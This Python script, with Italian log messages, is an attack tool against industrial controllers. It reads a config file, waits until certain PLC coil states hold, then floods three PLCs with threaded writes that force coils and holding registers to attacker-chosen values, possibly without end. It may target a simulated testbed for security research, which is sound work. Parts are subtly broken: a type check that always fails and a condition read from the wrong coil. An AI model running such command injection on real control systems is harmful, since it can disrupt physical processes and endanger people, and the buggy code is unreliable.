import time
from threading import Thread


# noinspection PyRedundantParentheses
def attack(ctx):
    register = []
    with open('config_attack.txt', 'r') as f:
        for i in f.readlines():
            register.append(i.split('='))
        print(register)

    cont = 1
    num_mex = 0
    thread_list = list()
    condition = list()


    '''for i in range(0, 5000):
        coil_register = ctx.register('plc3', 'C', i)
        print(coil_register.write(1))'''

    while('END TRIGGER' not in register[cont][0]):
        if ('Null' not in register[cont][1]):
            condition.append(register[cont][0] + ':' + register[cont][1])
        cont += 1

    thread = Thread(target = wait_condition, args = (ctx, condition,))
    thread.start()
    thread.join()

    # PLC 1
    if('START PLC1' in register[cont][0]):
        cont += 1
        while('END PLC1' not in register[cont][0]):
            print('cont ', cont)
            if('num' in register[cont][0]):
                if('inf' in register[cont][1]):
                    num_mex = 'inf'
                else:
                    num_mex = int(register[cont][1])
            if ('%QX0.0' in register[cont][0]):
                thread_list.append(Thread(target = write_coil, args = (ctx, 'plc1', 0, register[cont][1], num_mex, r'%QX0.0')))
            if ('%QX0.1' in register[cont][0]):
                thread_list.append(Thread(target = write_coil, args = (ctx, 'plc1', 1, register[cont][1], num_mex, r'%QX0.1')))
            if ('%QX0.2' in register[cont][0]):
                thread_list.append(Thread(target = write_coil, args = (ctx, 'plc1', 2, register[cont][1], num_mex, r'%QX0.2')))
            if ('%MW0' in register[cont][0]):
                thread_list.append(Thread(target = write_holding_register, args = (ctx, 'plc1', 1024, register[cont][1], num_mex, r'%MW0')))
            if ('%MW1' in register[cont][0]):
                thread_list.append(Thread(target = write_holding_register, args = (ctx, 'plc1', 1025, register[cont][1], num_mex, r'%MW1')))
            cont += 1
        cont += 1
    # PLC 2
    if('START PLC2' in register[cont][0]):
        cont += 1
        while('END PLC2' not in register[cont][0]):
            if('num' in register[cont][0]):
                if('inf' in register[cont][1]):
                    num_mex = 'inf'
                else:
                    num_mex = int(register[cont][1])
            if ('%QX0.0' in register[cont][0]):
                thread_list.append(Thread(target = write_coil, args = (ctx, 'plc2', 0, register[cont][1], num_mex, '%QX0.0')))
            if ('%MW1' in register[cont][0]):
                thread_list.append(Thread(target = write_holding_register, args = (ctx, 'plc2', 1025, register[cont][1], num_mex, r'%MW1')))
            if ('%MW2' in register[cont][0]):
                thread_list.append(Thread(target = write_holding_register, args = (ctx, 'plc2', 1026, register[cont][1], num_mex, r'%MW2')))
            cont += 1
        cont += 1
    # PLC 3
    if('START PLC3' in register[cont][0]):
        cont += 1
        while('END PLC3' not in register[cont][0]):
            if('num' in register[cont][0]):
                if('inf' in register[cont][1]):
                    num_mex = 'inf'
                else:
                    num_mex = int(register[cont][1])
            if ('%QX0.0' in register[cont][0]):
                thread_list.append(Thread(target = write_coil, args = (ctx, 'plc3', 0, register[cont][1], num_mex, r'%QX0.0')))
            if ('%QX0.1' in register[cont][0]):
                thread_list.append(Thread(target = write_coil, args = (ctx, 'plc3', 1, register[cont][1], num_mex, r'%QX0.1')))
            cont += 1
    for index, i in enumerate(thread_list):
        thread_list[index].start()
    for index, i in enumerate(thread_list):
        thread_list[index].join()
    print('Fine')


# noinspection PyRedundantParentheses
def write_coil(ctx, plc, num_coil, value, num_mes, name_coil):
    print('value: ', value)
    if('True' in value):
        value = 1
    else:
        value = 0
    coil_register = ctx.register(plc, 'C', num_coil)
    if(type(num_mes) != r"<class 'str'>"):
        for i in range(num_mes):
            coil_register.write(value)
            print('Scrittura del valore ' + str(value) + ' sulla coil ' + name_coil + ' della ' + plc)
    else:
        while(True):
            coil_register.write(value)
            print('Scrittura del valore ' + str(value) + ' sulla coil ' + name_coil + ' della ' + plc)

# noinspection PyRedundantParentheses
def write_holding_register(ctx, plc, address, value, num_mes, name_register):
    holding_register_1 = ctx.register(plc, 'H', address)
    if(type(num_mes) != r"<class 'str'>"):
        for i in range(num_mes):
            holding_register_1.write(int(value))
            print('Scrittura del valore' + str(value) + ' sull\' holding register ' + name_register + ' della ' + plc)
    else:
        while(True):
            holding_register_1.write(int(value))
            print('Scrittura del valore' + str(value) + ' sull\' holding register ' + name_register + ' della ' + plc)


# noinspection PyRedundantParentheses
def wait_condition(ctx, condition_reg):
    iteration = 0
    reading_list = list()
    condition_list = list()
    for i in condition_reg:
        temp = i.replace('', ' ').split(':')
        if(r'%QX0.0' in temp[0]):
            coil_register = ctx.register(temp[1].lower(), 'C', 0)
            reading_list.append(coil_register.read())
            condition_list.append(temp[2])
        if(r'%QX0.1' in temp[0]):
            coil_register = ctx.register(temp[1].lower(), 'C', 1)
            reading_list.append(coil_register.read())
            condition_list.append(temp[2])
        if(r'%QX0.2' in temp[0]):
            coil_register = ctx.register(temp[1].lower(), 'C', 1)
            reading_list.append(coil_register.read())
            condition_list.append(temp[2])

    flag = False
    while(flag == False):
        for i in range(len(reading_list)):
            if(reading_list[i] == condition_list[i]):
                flag = True
            else:
                flag = False
        if(iteration == 5):
            flag = True
        iteration += 1
        print('Waiting the condition...')
        time.sleep(0.5)
    print('The condition arise... \n Starting attack ... \n')